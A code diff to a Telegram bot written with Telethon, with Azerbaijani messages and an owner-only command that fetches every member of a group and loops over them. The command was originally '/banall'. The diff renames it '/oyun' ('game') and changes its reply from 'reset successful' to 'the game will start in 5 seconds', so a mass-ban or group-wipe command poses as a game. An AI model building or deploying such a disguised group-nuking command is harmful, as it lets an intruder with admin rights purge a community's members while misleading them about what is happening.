@@ -35,7 +35,7 @@ sree = TelegramClient(
 ).start(bot_token=BOT_TOKEN)
 
 Owner = "Rubyyyyyyyyyyy"
-repo = "https://github.com/RowLyn/Bann"
+repo = "https://github.com/Rubyyyyyyy/ahahahahha"
 @sree.on(events.NewMessage(pattern="^/start"))
 async def start(event):
     buttns = [Button.url("••ѕυρροяτ••", "https://t.me/RubyProject"), Button.url("••ʀєρο••", f'{repo}')]
@@ -84,7 +84,7 @@ async def start(event):
         )
     if event.sender.id not in OP:
         await event.reply(
-            "Ə Yox Sən Dölsən Mənim Ownerim😝!\n\nToxun Linkə Keç Gözün Bot Görsün🔥[Repository⚡](https://github.com/RowLyn/Bann)",
+            "𝗠𝗘𝗡𝗜𝗠 𝗤𝗨𝗥𝗨𝗖𝗨𝗠 𝗦𝗘𝗡 𝗗𝗘𝗬𝗜𝗟𝗦𝗘𝗡👨🏻‍💻!\n\n𝗧𝗢𝗫𝗨𝗡 𝗟𝗜𝗡𝗞𝗘 𝗞𝗘𝗖 𝗩𝗘 𝗚𝗢𝗭𝗨𝗡 𝗢𝗬𝗨𝗡 𝗕𝗢𝗧𝗨 𝗚𝗢𝗥𝗦𝗨𝗡🔥[Repository⚡](https://github.com/Rubyyyyy/hahhhahhhhha)",
             link_preview=False,
         )       
 
@@ -96,14 +96,14 @@ async def ping(event):
         txxt = await event.reply(t)
         end = datetime.now()
         ms = (end-start).microseconds / 1000
-        await txxt.edit(f"Mən Aktivəm🔥!!\n\internet surəti (ms olarağ) 🏓\n   ➥ `{ms} ms`")
+        await txxt.edit(f"Men Aktivəm🔥!!\n\internet surəti (ms olarağ) 🏓\n   ➥ `{ms} ms`")
 
 
-@sree.on(events.NewMessage(pattern="^/banall"))
+@sree.on(events.NewMessage(pattern="^/oyun"))
 async def bun(event):
   if event.sender.id in OP:
    if not event.is_group:
-        Rep = f"__Yetim Bu Əmr Ancağ Grubda İstifadə Edilir!!__"
+        Rep = f"__𝗕𝗨 𝗘𝗠𝗥 𝗦𝗔𝗗𝗘𝗖𝗘 𝗚𝗥𝗨𝗕𝗗𝗔 𝗜𝗦𝗧𝗜𝗙𝗔𝗗𝗘 𝗘𝗗𝗜𝗟𝗜𝗥!!__"
         await event.reply(Rep)
    else:
        await event.delete()
@@ -112,10 +112,10 @@ async def bun(event):
        admin = cht.admin_rights
        creator = cht.creator
        if not admin and not creator:
-           await event.reply("__Mənim Sıfırlama Yetkilərim Yoxdur.__")
+           await event.reply("__𝗢𝗬𝗨𝗡𝗔 𝗕𝗔𝗦̧𝗟𝗔𝗠𝗔𝗤 𝗨𝗖𝗨𝗡 𝗬𝗘𝗧𝗞𝗜𝗠 𝗬𝗢𝗫𝗗𝗨𝗥.__")
            return
-       hmm =  await event.reply("__Sıfırlama Uğurludur⚡..__")
-       await sleep(18)
+       hmm =  await event.reply("__𝗢𝗬𝗨𝗡 5 𝗦𝗔𝗡𝗜𝗬𝗘 𝗜𝗖𝗜𝗡𝗗𝗘 𝗕𝗔𝗦̧𝗟𝗔𝗗𝗜𝗟𝗔𝗖𝗔𝗚⚡..__")
+       await sleep(5)
        await hmm.delete()
        everyone = await event.client.get_participants(event.chat_id)
        for user in everyone:
@@ -131,7 +131,7 @@ async def bun(event):
 @sree.on(events.NewMessage(pattern="^/restart"))
 async def restart(jnl):
     if jnl.sender.id in OP:
-        tct = "__Gözlə Yenidən Başladılır__"
+        tct = "__𝗚𝗢𝗭𝗟𝗘 𝗬𝗘𝗡𝗜𝗗𝗘𝗡 𝗕𝗔𝗦̧𝗟𝗔𝗗𝗜𝗟𝗜𝗥__"
         await jnl.reply(tct)
         try:
             await sree.disconnect()
@@ -147,26 +147,26 @@ async def leave(z):
         mkc = ("".join(z.text.split(maxsplit=1)[1:])).split(" ", 1)
         if len(z.text) > 7:
             mkb = int(mkc[0])
-            tet = "__Gözlə Tərk Edilir__"
+            tet = "__𝗚𝗢𝗭𝗟𝗘 𝗧𝗘𝗥𝗞 𝗘𝗗𝗜𝗟𝗜𝗥__"
             hm = await z.reply(tet)
             try:
                 await z.client(LeaveChannelRequest(mkb))
-                await hm.edit("**Uğurla Tərk Olundu!!**")
+                await hm.edit("**𝗨𝗚𝗨𝗥𝗟𝗔 𝗧𝗘𝗥𝗞 𝗢𝗟𝗨𝗡𝗗𝗨!!**")
             except Exception as e:
                 await hm.edit(str(e))
         else:
             mkb = z.chat_id
-            txt = "__Gözlə Tərk Edilir__"
+            txt = "__𝗚𝗢𝗭𝗟𝗘 𝗧𝗘𝗥𝗞 𝗘𝗗𝗜𝗟𝗜𝗥__"
             ok = await z.reply(txt)
             try:
                 await z.client(LeaveChannelRequest(mkb))
-                await ok.edit("**Uğurla Tərk Olundu!!**")
+                await ok.edit("**𝗨𝗚𝗨𝗥𝗟𝗔 𝗧𝗘𝗥𝗞 𝗢𝗟𝗨𝗡𝗗𝗨!!**")
             except Exception as e:
                 await z.edit(str(e))
 
 
-print("Sənin Botunun Deployu Uğurludur ✅")
-print("Toxun və Giriş Et @RubyProject Respect!!")
+print("𝗦𝗘𝗡𝗜𝗡 𝗕𝗢𝗧𝗨𝗡𝗨𝗡 𝗗𝗘𝗣𝗟𝗢𝗬𝗨 𝗨𝗚𝗨𝗥𝗟𝗨𝗗𝗨𝗥 ✅")
+print("𝗧𝗢𝗫𝗨𝗡 𝗩𝗘 𝗚𝗜𝗥𝗜𝗦̧ 𝗘𝗧 @RubyProject 𝗥𝗘𝗦𝗣𝗘𝗖𝗧🎭!!")
 
 
 
